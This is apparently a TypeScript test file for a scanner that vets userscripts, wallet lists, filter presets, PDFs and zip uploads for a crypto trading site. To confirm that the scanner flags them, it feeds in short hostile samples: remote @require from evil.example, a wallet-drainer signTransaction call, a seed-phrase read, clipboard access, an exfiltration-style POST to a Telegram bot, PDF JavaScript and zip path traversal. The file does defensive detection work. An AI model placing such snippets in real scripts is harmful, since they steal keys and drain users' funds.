import { zipSync } from 'fflate';
import { describe, expect, it } from 'vitest';
import { isPubkey, markSymlink, scan } from './index';

const enc = (s: string) => new TextEncoder().encode(s);

function script(body: string, headerExtra = ''): string {
  return `// ==UserScript==
// @name sample
// @match https://axiom.trade/*
// @grant none
// @connect none
${headerExtra}// ==/UserScript==
${body}
`;
}

async function result(name: string, source: string, category: string, opts = {}) {
  const out = await scan({ name, bytes: enc(source) }, category, opts);
  const byId = Object.fromEntries(out.checks.map((c) => [c.ruleId, c.result]));
  return { out, byId };
}

describe('userscript rules', () => {
  it('passes a clean script', async () => {
    const { out, byId } = await result(
      'clean.user.js',
      script('const filters = { devHolding: "< 4%" };'),
      'userscript',
    );
    expect(out.summary).toBe('pass');
    expect(byId['header-valid']).toBe('pass');
    expect(byId['no-eval']).toBe('pass');
    expect(byId['no-sign-transaction']).toBe('pass');
    expect(byId['no-obfuscation']).toBe('pass');
    expect(byId['no-remote-code']).toBe('pass');
    expect(byId['no-key-access']).toBe('pass');
    expect(byId['no-clipboard-read']).toBe('pass');
    expect(byId['no-clipboard-write-address']).toBe('pass');
    expect(byId['network-declared']).toBe('pass');
    expect(byId['network-allowlist']).toBe('pass');
    expect(byId['grant-minimal']).toBe('pass');
    expect(byId['deps']).toBe('pass');
    expect(byId['match-scope']).toBe('pass');
    expect(byId['no-dom-wallet-tamper']).toBe('pass');
  });

  it('header-valid fails without a header and passes with one', async () => {
    const bad = await result('x.user.js', 'const x = 1;\n', 'userscript');
    expect(bad.byId['header-valid']).toBe('fail');
    const good = await result('x.user.js', script('const x = 1;'), 'userscript');
    expect(good.byId['header-valid']).toBe('pass');
  });

  it('match-scope warns on a wildcard match', async () => {
    const src = script('const x = 1;', '// @match *://*/*\n');
    const { byId } = await result('x.user.js', src, 'userscript');
    expect(byId['match-scope']).toBe('warn');
  });

  it('no-eval fails on eval and passes without it', async () => {
    const bad = await result('x.user.js', script("eval('alert(1)');"), 'userscript');
    expect(bad.byId['no-eval']).toBe('fail');
    const good = await result('x.user.js', script('const n = 1;'), 'userscript');
    expect(good.byId['no-eval']).toBe('pass');
  });

  it('no-remote-code fails off-allowlist @require and passes with SRI on an allowlisted host', async () => {
    const bad = await result(
      'x.user.js',
      script('const x = 1;', '// @require https://evil.example/a.js\n'),
      'userscript',
    );
    expect(bad.byId['no-remote-code']).toBe('fail');
    const missingSri = await result(
      'x.user.js',
      script('const x = 1;', '// @require https://cdn.jsdelivr.net/npm/left-pad\n'),
      'userscript',
    );
    expect(missingSri.byId['no-remote-code']).toBe('fail');
    const good = await result(
      'x.user.js',
      script('const x = 1;', '// @require https://cdn.jsdelivr.net/npm/left-pad#sha384-abc\n'),
      'userscript',
    );
    expect(good.byId['no-remote-code']).toBe('pass');
  });

  it('no-obfuscation fails a very long line', async () => {
    const { byId } = await result(
      'x.user.js',
      script(`const blob = '${'a'.repeat(5100)}';`),
      'userscript',
    );
    expect(byId['no-obfuscation']).toBe('fail');
  });

  it('no-sign-transaction fails a drainer call', async () => {
    const { byId, out } = await result(
      'drain.user.js',
      script('window.solana.signTransaction({ tx: 1 });'),
      'userscript',
    );
    expect(byId['no-sign-transaction']).toBe('fail');
    expect(out.summary).toBe('fail');
  });

  it('no-key-access fails a seed storage read', async () => {
    const { byId } = await result(
      'x.user.js',
      script("localStorage.getItem('seedPhrase');"),
      'userscript',
    );
    expect(byId['no-key-access']).toBe('fail');
  });

  it('clipboard read fails and clipboard write warns', async () => {
    const read = await result('x.user.js', script('navigator.clipboard.readText();'), 'userscript');
    expect(read.byId['no-clipboard-read']).toBe('fail');
    const write = await result(
      'x.user.js',
      script("navigator.clipboard.writeText('addr');"),
      'userscript',
    );
    expect(write.byId['no-clipboard-write-address']).toBe('warn');
  });

  it('network-declared warns on GM_xmlhttpRequest to an undeclared host', async () => {
    const src = script(
      "GM_xmlhttpRequest({ url: 'https://api.telegram.org/bot', method: 'POST' });",
      '// @grant GM_xmlhttpRequest\n',
    );
    const { byId } = await result('alerts.user.js', src, 'alerts');
    expect(byId['network-declared']).toBe('warn');
    expect(byId['network-allowlist']).toBe('warn');
  });

  it('no-dom-wallet-tamper warns on address selectors', async () => {
    const { byId } = await result(
      'x.user.js',
      script("document.querySelector('input.address');"),
      'userscript',
    );
    expect(byId['no-dom-wallet-tamper']).toBe('warn');
  });

  it('grant-minimal warns on unsafeWindow and deps warns when @require is present', async () => {
    const src = script(
      'const x = 1;',
      '// @grant unsafeWindow\n// @require https://cdn.jsdelivr.net/npm/x#sha384-abc\n',
    );
    const { byId } = await result('x.user.js', src, 'userscript');
    expect(byId['grant-minimal']).toBe('warn');
    expect(byId['deps']).toBe('warn');
  });
});

describe('data files', () => {
  it('wallet list passes valid pubkeys and fails junk', async () => {
    const { default: bs58 } = await import('bs58');
    const addr = bs58.encode(Uint8Array.from({ length: 32 }, (_, i) => i + 1));
    expect(isPubkey(addr)).toBe(true);
    const good = await scan(
      { name: 'w.json', bytes: enc(JSON.stringify([addr, addr])) },
      'wallet_list',
    );
    expect(good.checks.find((c) => c.ruleId === 'wl-schema')?.result).toBe('pass');
    expect(good.checks.find((c) => c.ruleId === 'wl-schema')?.detail).toMatch(/duplicate/i);
    const bad = await scan({ name: 'w.json', bytes: enc('["not-a-key"]') }, 'wallet_list');
    expect(bad.checks.find((c) => c.ruleId === 'wl-schema')?.result).toBe('fail');
  });

  it('wl-no-programs warns on the system program', async () => {
    const out = await scan(
      { name: 'w.json', bytes: enc('["11111111111111111111111111111111"]') },
      'wallet_list',
    );
    expect(out.checks.find((c) => c.ruleId === 'wl-no-programs')?.result).toBe('warn');
  });

  it('filter schema passes a clean preset and warns on unknown keys', async () => {
    const good = await scan(
      { name: 'f.json', bytes: enc(JSON.stringify({ devHolding: '< 4%', migratedOnly: true })) },
      'filter',
    );
    expect(good.summary).toBe('pass');
    const warn = await scan(
      { name: 'f.json', bytes: enc(JSON.stringify({ devHolding: '< 4%', extra: true })) },
      'filter',
    );
    expect(warn.checks.find((c) => c.ruleId === 'filter-schema')?.result).toBe('warn');
  });

  it('links warns on http and passes https', async () => {
    const bad = await scan(
      { name: 'a.md', bytes: enc('See http://example.com/phish') },
      'strategy',
    );
    expect(bad.checks.find((c) => c.ruleId === 'links')?.result).toBe('warn');
    const good = await scan(
      { name: 'a.md', bytes: enc('See https://example.com/docs') },
      'strategy',
    );
    expect(good.checks.find((c) => c.ruleId === 'links')?.result).toBe('pass');
    expect(good.checks.find((c) => c.ruleId === 'doc-safe')?.result).toBe('pass');
  });

  it('doc-safe rejects a PDF with JavaScript', async () => {
    const bytes = enc('%PDF-1.4\n/JavaScript (app.alert(1))\n%%EOF');
    const out = await scan({ name: 'play.pdf', bytes }, 'strategy');
    expect(out.checks.find((c) => c.ruleId === 'doc-safe')?.result).toBe('fail');
  });
});

describe('zip', () => {
  it('rejects path traversal, nested archives, and symlinks', async () => {
    const traversal = zipSync({ '../evil.txt': enc('x') });
    const t = await scan({ name: 's.zip', bytes: traversal }, 'setup');
    expect(t.checks.find((c) => c.ruleId === 'zip-safe')?.result).toBe('fail');

    const nested = zipSync({ 'inner.zip': zipSync({ 'a.txt': enc('hi') }) });
    const n = await scan({ name: 's.zip', bytes: nested }, 'setup');
    expect(n.checks.find((c) => c.ruleId === 'zip-safe')?.detail).toMatch(/nested/);

    const link = markSymlink(zipSync({ 'link.txt': enc('x') }));
    const s = await scan({ name: 's.zip', bytes: link }, 'setup');
    expect(s.checks.find((c) => c.ruleId === 'zip-safe')?.detail).toMatch(/symlink/);
  });

  it('scans a safe zip', async () => {
    const zip = zipSync({ 'readme.md': enc('Hello https://example.com') });
    const out = await scan({ name: 'desk.zip', bytes: zip }, 'setup');
    expect(out.checks.find((c) => c.ruleId === 'zip-safe')?.result).toBe('pass');
    expect(out.summary).not.toBe('fail');
  });
});
